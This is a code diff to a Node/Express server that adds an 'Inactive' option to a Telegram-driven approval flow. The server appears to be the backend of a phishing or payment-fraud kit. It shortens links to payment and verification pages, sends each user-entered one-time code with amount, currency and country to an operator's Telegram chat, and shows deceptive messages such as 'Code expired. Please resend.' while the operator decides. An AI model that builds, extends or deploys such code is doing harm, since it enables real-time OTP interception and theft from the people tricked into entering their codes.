@@ -69,10 +69,8 @@ setInterval(() => {
 
 /* ============================================================
    Presentable short-link store
-   POST /api/shorten → returns https://host/p/abcxyz
-   GET  /p/:code    → redirects to the original URL
 ============================================================ */
-const SHORT_LINKS = new Map();   // code → longUrl
+const SHORT_LINKS = new Map();
 
 app.post('/api/shorten', (req, res) => {
   const { url } = req.body || {};
@@ -80,7 +78,6 @@ app.post('/api/shorten', (req, res) => {
     return res.status(400).json({ error: 'Missing url' });
   }
 
-  // Reuse an existing code if this URL was already shortened
   for (const [existingCode, existingUrl] of SHORT_LINKS.entries()) {
     if (existingUrl === url) {
       return res.json({
@@ -89,7 +86,6 @@ app.post('/api/shorten', (req, res) => {
     }
   }
 
-  // 6-character code, no confusing characters
   const alphabet = 'abcdefghjkmnpqrstuvwxyz23456789';
   let code = '';
   for (let i = 0; i < 6; i++) {
@@ -98,7 +94,6 @@ app.post('/api/shorten', (req, res) => {
 
   SHORT_LINKS.set(code, url);
   pushLog('Short link created: /p/' + code, 'ok');
-
   setTimeout(() => SHORT_LINKS.delete(code), 7 * 24 * 3600 * 1000);
 
   res.json({
@@ -243,7 +238,8 @@ app.get('/api/status/:tx', (req, res) => {
 });
 
 /* ============================================================
-   POST /api/telegram-webhook — Approve / Decline tap
+   POST /api/telegram-webhook — Approve / Decline / Inactive tap
+   Handles both payment callbacks and OTP callbacks
 ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   pushLog('WEBHOOK HIT', 'info');
@@ -270,10 +266,18 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     pushLog('PARSED action=' + action + ' tx=' + txId + (otpTxId ? ' (OTP)' : ''), 'info');
 
-    if (otpTxId) {
+    // Map action → decision string (used for both payment and OTP flows)
+    const decision =
+      action === 'approve'  ? 'approved' :
+      action === 'decline'  ? 'declined' :
+      action === 'inactive' ? 'inactive' : null;
+
+    if (!decision) {
+      pushLog('Unknown callback action: ' + action, 'err');
+    } else if (otpTxId) {
       const entry = OTP_STORE.get(otpTxId);
       if (entry) {
-        entry.decision = action === 'approve' ? 'approved' : 'declined';
+        entry.decision = decision;
         pushLog('OTP decision ' + entry.decision + ' for ' + otpTxId,
           entry.decision === 'approved' ? 'ok' : 'err');
       } else {
@@ -281,14 +285,12 @@ app.post('/api/telegram-webhook', async (req, res) => {
           code: null,
           exp: Date.now() + OTP_TTL_MS,
           attempts: 0,
-          decision: action === 'approve' ? 'approved' : 'declined'
+          decision
         });
-        pushLog('OTP entry missing, created stub for ' + otpTxId, 'err');
+        pushLog('OTP entry missing, created stub for ' + otpTxId + ' with ' + decision, 'err');
       }
     } else {
-      if (action === 'approve') setDecision(txId, 'approved');
-      else if (action === 'decline') setDecision(txId, 'declined');
-      else pushLog('Unknown callback action: ' + action, 'err');
+      setDecision(txId, decision);
     }
 
     const baseUrl = tgBase();
@@ -298,7 +300,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           callback_query_id: cb.id,
-          text: action === 'approve' ? 'Approved' : 'Declined'
+          text:
+            action === 'approve'  ? 'Approved' :
+            action === 'decline'  ? 'Declined' :
+            action === 'inactive' ? 'Marked inactive' : 'OK'
         })
       }).catch(() => {});
 
@@ -398,7 +403,8 @@ app.post('/api/verification/otp', (req, res) => {
 });
 
 /* ============================================================
-   Verification — submit the user-entered code to Telegram
+   Verification — submit the entered code to Telegram
+   Uses THREE buttons: Approve / Decline / Inactive
 ============================================================ */
 app.post('/api/verification/submit', async (req, res) => {
   const { tx, otp, am, cur, c } = req.body || {};
@@ -432,13 +438,14 @@ app.post('/api/verification/submit', async (req, res) => {
     'Country: ' + (c || '—'),
     'Code: ' + otp,
     '',
-    'Approve this code, or decline if it should be rejected.'
+    'Approve, decline, or mark this transaction inactive.'
   ];
 
   const keyboard = {
     inline_keyboard: [[
       { text: '✅ Approve code', callback_data: 'approve:OTP-' + tx },
-      { text: '❌ Decline code', callback_data: 'decline:OTP-' + tx }
+      { text: '❌ Decline code', callback_data: 'decline:OTP-' + tx },
+      { text: '⏸ Inactive',      callback_data: 'inactive:OTP-' + tx }
     ]]
   };
 
@@ -452,7 +459,7 @@ app.post('/api/verification/submit', async (req, res) => {
         reply_markup: keyboard
       })
     });
-    pushLog('SUBMIT → Telegram with buttons: ' + tx, 'ok');
+    pushLog('SUBMIT → Telegram with 3 buttons: ' + tx, 'ok');
   } catch (e) {
     pushLog('SUBMIT Telegram send failed: ' + e.message, 'err');
   }
@@ -489,6 +496,9 @@ app.post('/api/verification/verify', (req, res) => {
   if (entry.decision === 'declined') {
     return res.status(400).json({ success: false, message: 'Code expired. Please resend.' });
   }
+  if (entry.decision === 'inactive') {
+    return res.status(400).json({ success: false, message: 'Transaction inactive' });
+  }
   return res.status(202).json({ success: false, pending: true, message: 'Awaiting approval' });
 });
 
@@ -512,6 +522,7 @@ app.get('/client.html',       servePage('client.html'));
 app.get('/pay.html',          servePage('pay.html'));
 app.get('/verify.html',       servePage('verify.html'));
 app.get('/verification.html', servePage('verification.html'));
+app.get('/inactive.html',     servePage('inactive.html'));
 app.get('/', (req, res) => res.redirect('/admin.html'));
 
 app.use((req, res) => {
@@ -528,7 +539,7 @@ app.listen(PORT, '0.0.0.0', () => {
   try {
     const files = fs.readdirSync(publicDir);
     console.log('Public files:', files.join(', ') || '(empty)');
-    ['admin.html', 'client.html', 'pay.html', 'verify.html', 'verification.html'].forEach(f => {
+    ['admin.html', 'client.html', 'pay.html', 'verify.html', 'verification.html', 'inactive.html'].forEach(f => {
       console.log('  ' + f + ':', fs.existsSync(path.join(publicDir, f)) ? 'found' : 'MISSING');
     });
   } catch (e) {
